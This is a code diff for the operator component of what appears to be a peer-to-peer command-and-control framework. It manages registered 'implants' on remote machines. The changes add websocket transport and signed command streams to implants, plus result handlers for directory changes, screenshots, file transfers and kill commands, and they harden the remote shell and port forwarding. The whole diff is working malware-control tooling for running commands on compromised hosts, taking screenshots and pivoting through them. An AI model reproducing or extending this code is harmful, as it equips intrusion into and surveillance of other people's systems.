@@ -16,7 +16,8 @@ import (
 	"github.com/libp2p/go-libp2p/core/crypto"
 	"github.com/libp2p/go-libp2p/core/network"
 	"github.com/libp2p/go-libp2p/core/peer"
-	"github.com/libp2p/go-libp2p/p2p/transport/tcp"
+	tcp "github.com/libp2p/go-libp2p/p2p/transport/tcp"
+	ws "github.com/libp2p/go-libp2p/p2p/transport/websocket"
 	"google.golang.org/protobuf/proto"
 	"golang.org/x/term"
 
@@ -60,7 +61,7 @@ func NewOperator(ctx context.Context, keys *cryptography.OperatorKey, relayAddrs
 	ctx, cancel := context.WithCancel(ctx)
 
 	nodeCfg := transport.NodeConfig{
-		ListenAddr:     "/ip4/0.0.0.0/tcp/0",
+		ListenAddr:     "/ip4/0.0.0.0/tcp/0/ws",
 		BootstrapPeers: transport.DefaultBootstrapAddrs(),
 		EnableRelay:    true,
 		EnableMDNS:     true,
@@ -71,8 +72,8 @@ func NewOperator(ctx context.Context, keys *cryptography.OperatorKey, relayAddrs
 
 	node, err := transport.NewNode(ctx, nodeCfg,
 		libp2p.NoTransports,
+		libp2p.Transport(ws.New),
 		libp2p.Transport(tcp.NewTCPTransport),
-		libp2p.EnableHolePunching(),
 	)
 	if err != nil {
 		cancel()
@@ -98,6 +99,8 @@ func (o *Operator) Start() error {
 	log.Printf("[operator] PeerID: %s", o.node.ID().String())
 	log.Printf("[operator] Command topic: %s", o.messenger.CommandTopic())
 	log.Printf("[operator] Beacon topic: %s", o.messenger.BeaconTopic())
+
+	o.node.SetStreamHandler(transport.BeaconProtocolID, o.handleBeaconStream)
 
 	if err := o.node.StartDiscovery(); err != nil {
 		return fmt.Errorf("discovery: %w", err)
@@ -136,7 +139,6 @@ func (o *Operator) Start() error {
 	if err := o.messenger.ListenBeacons(o.ctx); err != nil {
 		return fmt.Errorf("listen beacons: %w", err)
 	}
-	o.node.SetStreamHandler(transport.BeaconProtocolID, o.handleBeaconStream)
 
 	go o.disconnectCheckLoop()
 
@@ -210,12 +212,18 @@ func (o *Operator) handleMessage(ctx context.Context, env *apb.Envelope, senderP
 		o.handleLsResult(env)
 	case transport.MsgTypeExecute:
 		o.handleExecuteResult(env)
+	case transport.MsgTypeCd:
+		o.handleCdResult(env)
 	case transport.MsgTypePwd:
 		o.handlePwdResult(env)
 	case transport.MsgTypeDownload:
 		o.handleDownloadResult(env)
 	case transport.MsgTypeUpload:
 		o.handleUploadResult(env)
+	case transport.MsgTypeScreenshot:
+		o.handleScreenshotResult(env)
+	case transport.MsgTypeKill:
+		o.handleKillResult(env)
 	default:
 		log.Printf("[operator] received message type=%d", env.Type)
 	}
@@ -223,30 +231,44 @@ func (o *Operator) handleMessage(ctx context.Context, env *apb.Envelope, senderP
 
 func (o *Operator) handleBeaconStream(s network.Stream) {
 	defer s.Close()
-	var msgLen uint32
-	if err := binary.Read(s, binary.LittleEndian, &msgLen); err != nil {
-		log.Printf("[operator] beacon stream read len: %v", err)
-		return
+	remotePeer := s.Conn().RemotePeer()
+	for {
+		var msgLen uint32
+		if err := binary.Read(s, binary.LittleEndian, &msgLen); err != nil {
+			if err.Error() != "EOF" {
+				log.Printf("[operator] beacon stream read len: %v", err)
+			}
+			return
+		}
+		if msgLen > 1<<20 {
+			log.Printf("[operator] beacon stream message too large: %d", msgLen)
+			return
+		}
+		data := make([]byte, msgLen)
+		if _, err := io.ReadFull(s, data); err != nil {
+			log.Printf("[operator] beacon stream read data: %v", err)
+			return
+		}
+		env := &apb.Envelope{}
+		if err := proto.Unmarshal(data, env); err != nil {
+			log.Printf("[operator] beacon stream unmarshal: %v", err)
+			continue
+		}
+		var pubKey crypto.PubKey
+		if len(env.SenderKey) > 0 {
+			pubKey, _ = transport.PubKeyFromEnvelope(env)
+			senderID, err := peer.IDFromPublicKey(pubKey)
+			if err != nil || senderID != remotePeer {
+				log.Printf("[operator] beacon stream sender mismatch")
+				continue
+			}
+		}
+		if err := transport.VerifyEnvelope(env, pubKey); err != nil {
+			log.Printf("[operator] beacon stream invalid signature: %v", err)
+			continue
+		}
+		o.handleMessage(o.ctx, env, pubKey)
 	}
-	if msgLen > 1<<20 {
-		log.Printf("[operator] beacon stream message too large: %d", msgLen)
-		return
-	}
-	data := make([]byte, msgLen)
-	if _, err := io.ReadFull(s, data); err != nil {
-		log.Printf("[operator] beacon stream read data: %v", err)
-		return
-	}
-	env := &apb.Envelope{}
-	if err := proto.Unmarshal(data, env); err != nil {
-		log.Printf("[operator] beacon stream unmarshal: %v", err)
-		return
-	}
-	var pubKey crypto.PubKey
-	if len(env.SenderKey) > 0 {
-		pubKey, _ = transport.PubKeyFromEnvelope(env)
-	}
-	o.handleMessage(o.ctx, env, pubKey)
 }
 
 func (o *Operator) handleBeaconRegister(env *apb.Envelope) {
@@ -273,7 +295,12 @@ func (o *Operator) handleBeaconRegister(env *apb.Envelope) {
 		return
 	}
 
-	peerID := o.senderPeerID(reg)
+	peerID, err := peer.IDFromPublicKey(pubKey)
+	if err != nil {
+		log.Printf("[operator] peer id from sender key: %v", err)
+		return
+	}
+	peerIDStr := peerID.String()
 
 	rec := &ImplantRecord{
 		Name:        reg.Name,
@@ -285,7 +312,7 @@ func (o *Operator) handleBeaconRegister(env *apb.Envelope) {
 		OS:          reg.OS,
 		Arch:        reg.Arch,
 		PID:         reg.PID,
-		PeerID:      peerID,
+		PeerID:      peerIDStr,
 		Version:     reg.Version,
 		ActiveC2:    reg.ActiveC2,
 		Locale:      reg.Locale,
@@ -296,7 +323,7 @@ func (o *Operator) handleBeaconRegister(env *apb.Envelope) {
 	}
 
 	o.mu.Lock()
-	if existing, ok := o.implants[peerID]; ok {
+	if existing, ok := o.implants[peerIDStr]; ok {
 		existing.LastCheckin = time.Now()
 		existing.Disconnected = false
 		existing.Hostname = reg.Hostname
@@ -304,17 +331,13 @@ func (o *Operator) handleBeaconRegister(env *apb.Envelope) {
 		existing.OS = reg.OS
 		existing.Arch = reg.Arch
 	} else {
-		o.implants[peerID] = rec
+		o.implants[peerIDStr] = rec
 		log.Printf("[operator] new implant registered: %s@%s [%s/%s] peer=%s",
-			reg.Name, reg.Hostname, reg.OS, reg.Arch, peerID)
+			reg.Name, reg.Hostname, reg.OS, reg.Arch, peerIDStr)
 	}
 	o.mu.Unlock()
 
-	o.messenger.AddKnownImplant(peerID, pubKey)
-}
-
-func (o *Operator) senderPeerID(reg *apb.Register) string {
-	return reg.ActiveC2
+	o.messenger.AddKnownImplant(peerIDStr, pubKey)
 }
 
 func (o *Operator) ListImplants() []*ImplantRecord {
@@ -341,9 +364,9 @@ func (o *Operator) GetImplant(peerID string) *ImplantRecord {
 }
 
 func (o *Operator) sendCommandToImplant(implantPeerID string, msgType uint32, msg proto.Message) error {
-	rec := o.GetImplant(implantPeerID)
-	if rec == nil {
-		return fmt.Errorf("implant %s not found", implantPeerID)
+	pid, err := peer.Decode(implantPeerID)
+	if err != nil {
+		return fmt.Errorf("decode peer id %s: %w", implantPeerID, err)
 	}
 
 	data, err := proto.Marshal(msg)
@@ -352,7 +375,43 @@ func (o *Operator) sendCommandToImplant(implantPeerID string, msgType uint32, ms
 	}
 
 	env := o.messenger.CreateEnvelope(msgType, data)
-	return o.messenger.SignAndSend(o.ctx, o.messenger.TaskTopic(implantPeerID), env)
+	signingData, err := transport.EnvelopeSigningBytes(env)
+	if err != nil {
+		return fmt.Errorf("signing bytes: %w", err)
+	}
+	sig, err := o.keys.PrivateKey.Sign(signingData)
+	if err != nil {
+		return fmt.Errorf("sign: %w", err)
+	}
+	env.Signature = sig
+	pubBytes, err := crypto.MarshalPublicKey(o.keys.PrivateKey.GetPublic())
+	if err == nil {
+		env.SenderKey = pubBytes
+	}
+
+	ctx, cancel := context.WithTimeout(o.ctx, 10*time.Second)
+	defer cancel()
+	ctx = network.WithAllowLimitedConn(ctx, "command")
+
+	s, err := o.node.NewStream(ctx, pid, transport.CmdProtocolID)
+	if err != nil {
+		return fmt.Errorf("open command stream: %w", err)
+	}
+	defer s.Close()
+
+	envData, err := proto.Marshal(env)
+	if err != nil {
+		return fmt.Errorf("marshal envelope: %w", err)
+	}
+
+	if err := binary.Write(s, binary.LittleEndian, uint32(len(envData))); err != nil {
+		return fmt.Errorf("write len: %w", err)
+	}
+	if _, err := s.Write(envData); err != nil {
+		return fmt.Errorf("write data: %w", err)
+	}
+
+	return nil
 }
 
 func (o *Operator) Ps(implantPeerID string) error {
@@ -422,6 +481,19 @@ func (o *Operator) handleExecuteResult(env *apb.Envelope) {
 	}
 }
 
+func (o *Operator) handleCdResult(env *apb.Envelope) {
+	result := &apb.Z21{}
+	if err := proto.Unmarshal(env.Data, result); err != nil {
+		log.Printf("[operator] unmarshal cd result: %v", err)
+		return
+	}
+	if result.Response != nil && result.Response.Err != 0 {
+		fmt.Printf("cd error: %s\n", result.Response.ErrMsg)
+	} else {
+		fmt.Printf("cd: %s\n", result.Path)
+	}
+}
+
 func (o *Operator) handlePwdResult(env *apb.Envelope) {
 	result := &apb.Z21{}
 	if err := proto.Unmarshal(env.Data, result); err != nil {
@@ -429,6 +501,19 @@ func (o *Operator) handlePwdResult(env *apb.Envelope) {
 		return
 	}
 	fmt.Println(result.Path)
+}
+
+func (o *Operator) handleScreenshotResult(env *apb.Envelope) {
+	result := &apb.Z3{}
+	if err := proto.Unmarshal(env.Data, result); err != nil {
+		log.Printf("[operator] unmarshal screenshot result: %v", err)
+		return
+	}
+	if result.Response != nil && result.Response.Err != 0 {
+		fmt.Printf("screenshot error: %s\n", result.Response.ErrMsg)
+	} else {
+		fmt.Printf("screenshot: %d bytes (saving not implemented)\n", len(result.Data))
+	}
 }
 
 func (o *Operator) handleDownloadResult(env *apb.Envelope) {
@@ -439,6 +524,10 @@ func (o *Operator) handleDownloadResult(env *apb.Envelope) {
 	}
 	if !result.Exists {
 		fmt.Printf("download: file does not exist\n")
+		return
+	}
+	if result.Response != nil && result.Response.Err != 0 {
+		fmt.Printf("download error: %s\n", result.Response.ErrMsg)
 		return
 	}
 	path := result.Path
@@ -458,7 +547,16 @@ func (o *Operator) handleUploadResult(env *apb.Envelope) {
 		log.Printf("[operator] unmarshal upload result: %v", err)
 		return
 	}
+	if result.Response != nil && result.Response.Err != 0 {
+		fmt.Printf("upload error: %s\n", result.Response.ErrMsg)
+		return
+	}
 	fmt.Printf("uploaded %d bytes to %s\n", result.BytesWritten, result.Path)
+}
+
+func (o *Operator) handleKillResult(env *apb.Envelope) {
+	log.Printf("[operator] implant confirmed kill")
+	fmt.Println("implant kill confirmed")
 }
 
 func (o *Operator) Cd(implantPeerID string, path string) error {
@@ -485,13 +583,38 @@ func (o *Operator) Upload(implantPeerID string, path string, data []byte) error 
 	return o.sendCommandToImplant(implantPeerID, transport.MsgTypeUpload, req)
 }
 
+type shellEscaper struct {
+	r       io.Reader
+	escaped bool
+}
+
+func (e *shellEscaper) Read(p []byte) (int, error) {
+	if e.escaped {
+		return 0, fmt.Errorf("shell escape")
+	}
+	n, err := e.r.Read(p)
+	if n > 0 {
+		for i := 0; i < n; i++ {
+			if p[i] == 0x1d { // Ctrl+]
+				e.escaped = true
+				return 0, fmt.Errorf("shell escape")
+			}
+		}
+	}
+	return n, err
+}
+
 func (o *Operator) OpenShell(implantPeerID string) error {
 	pid, err := peer.Decode(implantPeerID)
 	if err != nil {
 		return fmt.Errorf("decode peer id %s: %w", implantPeerID, err)
 	}
 
-	s, err := o.node.NewStream(o.ctx, pid, transport.ShellProtocolID)
+	ctx, cancel := context.WithTimeout(o.ctx, 15*time.Second)
+	defer cancel()
+	ctx = network.WithAllowLimitedConn(ctx, "shell")
+
+	s, err := o.node.NewStream(ctx, pid, transport.ShellProtocolID)
 	if err != nil {
 		return fmt.Errorf("open shell stream to %s: %w", implantPeerID, err)
 	}
@@ -517,7 +640,7 @@ func (o *Operator) OpenShell(implantPeerID string) error {
 	errCh := make(chan error, 2)
 
 	go func() {
-		_, err := io.Copy(s, os.Stdin)
+		_, err := io.Copy(s, &shellEscaper{r: os.Stdin})
 		errCh <- err
 	}()
 	go func() {
@@ -553,7 +676,11 @@ func (o *Operator) Portfwd(implantPeerID string, localPort int, target string) e
 		go func() {
 			defer localConn.Close()
 
-			s, err := o.node.NewStream(o.ctx, pid, transport.PortfwdProtocolID)
+			pctx, pcancel := context.WithTimeout(o.ctx, 15*time.Second)
+			defer pcancel()
+			pctx = network.WithAllowLimitedConn(pctx, "portfwd")
+
+			s, err := o.node.NewStream(pctx, pid, transport.PortfwdProtocolID)
 			if err != nil {
 				log.Printf("[operator] portfwd stream: %v", err)
 				return
